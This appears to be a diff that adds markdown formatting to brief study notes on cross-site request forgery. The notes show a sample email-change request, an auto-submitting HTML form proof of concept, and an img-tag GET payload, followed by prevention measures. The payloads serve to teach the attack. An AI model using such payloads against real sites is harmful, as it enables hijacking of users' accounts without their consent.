@@ -1,3 +1,6 @@
+# CSRF
+
+```
 POST /email/change HTTP/1.1
 Host: vulnerable-website.com
 Content-Type: application/x-www-form-urlencoded
@@ -5,9 +8,11 @@ Content-Length: 30
 Cookie: session=yvthwsztyeQkAPzeQ5gHgTvlyxHfsAfE
 
 email=wiener@normal-user.com
+```
 
 Convert the above request to:
 
+```
 <html>
     <body>
         <form action="https://vulnerable-website.com/email/change" method="POST">
@@ -18,15 +23,18 @@ Convert the above request to:
         </script>
     </body>
 </html>
+```
 
 If the user is logged in to the vulnerable website, their browser will automatically include their session cookie in the request (assuming SameSite cookies are not being used)
 
 CSRF PoC generator - Burp Suite Professional
 
 Note that some simple CSRF exploits employ the GET method and can be fully self-contained with a single URL on the vulnerable website
-<img src="https://vulnerable-website.com/email/change?email=pwned@evil-user.net">
+`<img src="https://vulnerable-website.com/email/change?email=pwned@evil-user.net">`
 
-How to Prevent:
+## How to Prevent:
 CSRF tokens
+
 SameSite cookies
+
 Referer-based validation
